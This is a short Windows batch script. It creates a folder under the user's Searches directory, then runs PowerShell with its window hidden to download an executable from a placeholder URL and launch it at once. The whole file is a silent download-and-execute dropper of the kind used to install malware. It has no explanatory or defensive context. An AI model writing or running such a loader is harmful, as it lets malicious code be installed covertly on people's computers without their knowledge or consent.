@ECHO OFF
cd \
cd %userprofile%
cd Searches
mkdir 123
cd 123 
powershell.exe -windowstyle hidden Invoke-WebRequest -OutFile 1234.exe -Uri https://www.exmaple.com/file/example.exe
.\1234.exe
